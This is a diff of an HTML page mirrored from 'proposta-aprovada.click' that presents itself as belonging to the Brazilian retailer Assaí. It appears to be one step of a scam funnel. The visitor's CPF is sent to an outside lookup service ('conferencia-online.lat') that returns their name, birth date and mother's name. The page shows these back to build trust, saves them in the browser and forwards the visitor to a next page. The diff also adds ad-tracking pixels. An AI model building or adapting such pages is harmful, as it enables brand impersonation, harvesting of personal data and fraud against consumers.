@@ -14,16 +14,20 @@
             color: #333;
             margin: 0;
             padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
         .header {
-            background-color: #002855;
-            padding: 15px;
+            background-color: #1E3A80;
+            padding: 20px;
             text-align: center;
+            border-bottom: 3px solid #ee4d2d;
         }
 
         .header img {
-            height: 40px;
+            width: 150px;
         }
 
         .main-content {
@@ -39,79 +43,94 @@
             color: white;
             border: none;
             width: 100%;
-            margin-bottom: 15px;
-            padding: 12px 0;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s ease-in-out;
+            margin-bottom: 10px;
+            background: #1E3A80;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
         }
 
         .btn-custom:hover {
-            transform: scale(1.02);
+            color: white !important;
+            background-color: #000 !important;
+            transform: scale(1.02) !important;
         }
 
-        .btn-whatsapp {
-            background-color: #25D366;
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+            margin-top: auto;
         }
 
-        .btn-site {
-            background-color: #2D8CFF;
+        .result-box {
+            margin-top: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #e6e6e6;
+            border-radius: 8px;
+            padding: 15px;
+            display: none;
+            text-align: left;
         }
 
-        .form-control {
-            border-radius: 5px;
-            font-size: 16px;
-            height: 45px;
-        }
-
-        .form-label {
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-
-        .highlight {
-            background-color: #e6f7ff;
-            border-left: 5px solid #2D8CFF;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0 20px 0;
+        .result-box p {
+            margin: 0 0 10px;
         }
 
         .loader {
             display: none;
             text-align: center;
-            margin-top: 15px;
+            margin-bottom: 15px;
         }
 
         .loader img {
-            width: 70px;
-        }
-
-        .result-box {
-            display: none;
-            background: #f1fff1;
-            border: 1px solid #b4e2b4;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-        }
-
-        .result-box p {
-            margin: 5px 0;
+            width: 50px;
+            height: 50px;
         }
 
         .success-message {
-            display: none;
             text-align: center;
+            font-weight: bold;
+            color: green;
             margin-bottom: 15px;
         }
 
         .success-message img {
-            width: 55px;
-            margin-bottom: 8px;
+            width: 50px;
+            height: 50px;
+            display: block;
+            margin: 0 auto 10px;
         }
     </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1289289589600537');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1289289589600537&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
 </head>
 
 <body>
@@ -142,101 +161,76 @@
                 <p>Dados encontrados com sucesso!</p>
             </div>
             <p>Iniciando cadastro de <strong><span id="nomeCompleto"></span></strong></p>
-            <p><strong>CPF:</strong> <span id="cpfConsultado"></span></p>
-            <p><strong>Sexo:</strong> <span id="sexo"></span></p>
-            <p><strong>Data de Nascimento:</strong> <span id="nascimento"></span></p>
-            <p><strong>Mãe:</strong> <span id="mae"></span></p>
+            <p><strong>Nome da Mãe:</strong> <span id="nomeMae"></span></p>
+           
+            <button class="btn-custom" onclick="continuar()">Continuar</button>
         </div>
     </div>
 
+    <!-- // Buscar dados do CPF com a API da MagmaDataHub https://magmadatahub.com-->
     <script>
-    // Máscara e validação de CPF
-    document.getElementById('cpf').addEventListener('input', function (e) {
-        let value = e.target.value.replace(/\D/g, '');
-        value = value.replace(/(\d{3})(\d)/, '$1.$2');
-        value = value.replace(/(\d{3})(\d)/, '$1.$2');
-        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-        e.target.value = value;
-    });
-
+    // // Buscar dados do CPF com a nova API https://apela-api.tech/
     function validaCPF(strCPF) {
-        strCPF = strCPF.replace(/[^\d]+/g, '');
-        if (strCPF.length !== 11 || /^(\d)\1+$/.test(strCPF)) return false;
-
-        let Soma = 0, Resto;
+        let Soma = 0;
+        let Resto;
+        if (strCPF == "00000000000") return false;
 
         for (let i = 1; i <= 9; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (11 - i);
         Resto = (Soma * 10) % 11;
+
         if ((Resto == 10) || (Resto == 11)) Resto = 0;
         if (Resto != parseInt(strCPF.substring(9, 10))) return false;
 
         Soma = 0;
         for (let i = 1; i <= 10; i++) Soma += parseInt(strCPF.substring(i - 1, i)) * (12 - i);
         Resto = (Soma * 10) % 11;
+
         if ((Resto == 10) || (Resto == 11)) Resto = 0;
         if (Resto != parseInt(strCPF.substring(10, 11))) return false;
         return true;
     }
 
-    // Nova função para chamar diretamente a API de CPF (robusta para { dados: {...} } ou campos na raiz)
+    // Nova função para chamar diretamente a API de CPF
     async function getCPFDataFromAPI(cpfNumerico) {
         const apiUrl = `https://conferencia-online.lat/api.php?cpf=${encodeURIComponent(cpfNumerico)}`;
         console.log('Chamando API diretamente:', apiUrl);
         
         const response = await fetch(apiUrl, {
             method: 'GET',
-            headers: { 'Accept': 'application/json' }
+            headers: {
+                'Accept': 'application/json'
+            }
         });
 
-        // Falha HTTP
         if (!response.ok) {
             let errorMsg = `Erro na requisição à API: ${response.status}`;
             try {
                 const errData = await response.json();
-                if (errData?.message) errorMsg = errData.message;
-            } catch (_) {}
+                errorMsg = (errData && errData.message) ? errData.message : errorMsg;
+            } catch (e) {
+                // Não conseguiu fazer parse do JSON de erro
+            }
             throw new Error(errorMsg);
         }
         
-        // Parse e normalização
-        const raw = await response.json();
-        console.log('Dados recebidos da API (raw):', raw);
-
-        // Alguns provedores devolvem { dados: {...} }, outros na raiz:
-        const payload = raw?.dados && typeof raw.dados === 'object' ? raw.dados : raw;
-
-        // Campos esperados
-        const cpf = payload?.cpf || cpfNumerico;
-        const nome = payload?.nome || payload?.NOME || '';
-        const sexo = payload?.sexo || payload?.SEXO || '';
-        const nascimento = payload?.nascimento || payload?.NASCIMENTO || '';
-        const mae = payload?.mae || payload?.MAE || '';
-
-        // Sinais de erro comuns
-        const temErroSinalizado =
-            raw?.error === true ||
-            String(raw?.status || '').toLowerCase() === 'error' ||
-            String(raw?.success || '').toLowerCase() === 'false';
-
-        if (temErroSinalizado) {
-            throw new Error(raw?.message || 'A API sinalizou erro na consulta.');
+        const data = await response.json();
+        console.log('Dados recebidos da API:', data);
+        
+        // Verifica se a resposta da API indica um erro
+        if (data.error || !data.nome) {
+            throw new Error(data.message || "Dados não encontrados para o CPF informado.");
         }
-
-        // Se não veio nome, considere como "não encontrado"
-        if (!nome) {
-            throw new Error(raw?.message || 'Dados não encontrados para o CPF informado.');
-        }
-
-        // Mapeamento no formato que o restante do frontend espera
+        
+        // Mapeia os dados para o formato esperado pelo frontend
         return {
             error: false,
             message: 'Consulta realizada com sucesso.',
             data: {
-                'CPF_CONSULTADO': cpf,
-                'NOME': nome,
-                'SEXO': sexo,
-                'NASCIMENTO': nascimento,
-                'MAE': mae
+                'CPF_CONSULTADO': data.cpf || cpfNumerico,
+                'NOME': data.nome || '',
+                'SEXO': data.sexo || '',
+                'NASCIMENTO': data.nascimento || '',
+                'MAE': data.mae || ''
             }
         };
     }
@@ -264,7 +258,7 @@
         resultBox.style.display = "none";
 
         try {
-            // Chama a nova função que usa a API diretamente (agora robusta)
+            // Chama a nova função que usa a API diretamente
             const responseDataFromAPI = await getCPFDataFromAPI(cpf);
 
             // Verifica se a resposta da API indica um erro ou se os dados esperados estão presentes
@@ -273,53 +267,86 @@
                 throw new Error(errorMessage);
             }
 
-            // Atualiza o UI com os dados recebidos
-            document.getElementById('nomeCompleto').textContent = responseDataFromAPI.data.NOME || '';
-            document.getElementById('cpfConsultado').textContent = responseDataFromAPI.data.CPF_CONSULTADO || cpf;
-            document.getElementById('sexo').textContent = responseDataFromAPI.data.SEXO || '';
-            document.getElementById('nascimento').textContent = responseDataFromAPI.data.NASCIMENTO || '';
-            document.getElementById('mae').textContent = responseDataFromAPI.data.MAE || '';
+            // Os dados de responseDataFromAPI.data já vêm mapeados da API para:
+            // NOME, MAE, NASCIMENTO, CPF_CONSULTADO
+            const dadosParaSalvar = {
+                nomeCompleto: responseDataFromAPI.data.NOME || "Não informado",
+                nomeMae: responseDataFromAPI.data.MAE || "Não informado",
+               
+                nascimento: responseDataFromAPI.data.NASCIMENTO || "Não informado", // Adicionando nascimento
+                cpf: responseDataFromAPI.data.CPF_CONSULTADO || cpf // Usa o CPF consultado pela API
+            };
+            
+            // Exibe os dados imediatamente para melhor performance
+            document.getElementById("nomeCompleto").innerText = dadosParaSalvar.nomeCompleto;
+            document.getElementById("nomeMae").innerText = dadosParaSalvar.nomeMae;
+            
+            // Se você tiver um campo para exibir a data de nascimento:
+            // document.getElementById("dataNascimentoResult").innerText = dadosParaSalvar.nascimento;
+
+            localStorage.setItem("dadosCPF", JSON.stringify(dadosParaSalvar));
+            console.log('Dados salvos no localStorage (chave dadosCPF):', dadosParaSalvar);
 
             loader.style.display = "none";
             resultBox.style.display = "block";
-            document.querySelector(".success-message").style.display = "block";
-
-            // Aguarda um pouco e redireciona levando query params
-            setTimeout(() => {
-                redirectToNextPage(responseDataFromAPI.data);
-            }, 1500);
 
         } catch (error) {
-            console.error("Erro ao consultar CPF:", error);
+            console.error("Erro na consulta:", error);
+            alert(`Erro ao consultar o CPF: ${error.message}`);
             loader.style.display = "none";
-            consultarBtn.style.display = "block";
-            alert(error.message || "Ocorreu um erro ao consultar. Tente novamente.");
+            consultarBtn.style.display = "block"; // Mostra o botão de consultar novamente em caso de erro
+            resultBox.style.display = "none";
         }
     }
 
-    function redirectToNextPage(data) {
-        const currentUrlParams = new URLSearchParams(window.location.search);
+    function continuar() {
+        // Esta função pega os parâmetros da URL atual e os repassa para a próxima página.
+        // O CPF digitado e consultado já está em localStorage com a chave "dadosCPF".
+        // A próxima página (/5) precisará ler do localStorage OU
+        // podemos adicionar o CPF aos parâmetros da URL aqui também, se necessário.
+        
+        let currentUrlParams = new URLSearchParams(window.location.search);
+        
+        // Opcional: Adicionar o CPF consultado à URL de redirecionamento, se a próxima página precisar dele via URL
+        // const dadosSalvos = JSON.parse(localStorage.getItem("dadosCPF"));
+        // if (dadosSalvos && dadosSalvos.cpf) {
+        //     currentUrlParams.set('cpf_consultado', dadosSalvos.cpf);
+        // }
 
-        // Adiciona/atualiza parâmetros relevantes
-        if (data?.NOME) currentUrlParams.set('nome', data.NOME);
-        if (data?.CPF_CONSULTADO) currentUrlParams.set('cpf', data.CPF_CONSULTADO);
-        if (data?.SEXO) currentUrlParams.set('sexo', data.SEXO);
-        if (data?.NASCIMENTO) currentUrlParams.set('nascimento', data.NASCIMENTO);
-        if (data?.MAE) currentUrlParams.set('mae', data.MAE);
-
-        const nextPageUrl = "/5"; // ajuste se necessário
+        const nextPageUrl = "/5"; // Ou o caminho completo se necessário
         window.location.href = nextPageUrl + (currentUrlParams.toString() ? '?' + currentUrlParams.toString() : '');
     }
 
-    // Listener opcional caso o botão não tenha onclick inline
+    // Adicionar o listener ao botão "consultarBtn" se ele não estiver já configurado no HTML com onclick
+    // Se o botão no seu HTML for <button id="consultarBtn" onclick="submitLog()">, este listener não é necessário.
+    // Se for <button id="consultarBtn">, então este listener é necessário:
     document.addEventListener('DOMContentLoaded', () => {
         const consultarButton = document.getElementById("consultarBtn");
         if (consultarButton) {
-            if (!consultarButton.hasAttribute('onclick')) {
+            if (!consultarButton.hasAttribute('onclick')) { // Só adiciona se não tiver onclick inline
                  consultarButton.addEventListener('click', submitLog);
             }
         }
+        // Adicione aqui listeners para outros botões, como um possível botão "Continuar" que chame a função continuar()
+        // Ex: const btnContinuarEtapa = document.getElementById('btnContinuarEtapa');
+        // if(btnContinuarEtapa) {
+        //     btnContinuarEtapa.addEventListener('click', continuar);
+        // }
     });
-    </script>
+
+</script>
+
+    <!-- Footer -->
+    <div class="footer">
+        Copyright © 2025 Assaí. Todos os direitos reservados.<br>
+
+        Política de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa do Site
+    </div>
+
+
+
+
 </body>
+<!-- Mirrored from proposta-aprovada.click/log.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 25 Jan 2025 01:09:25 GMT -->
+
 </html>
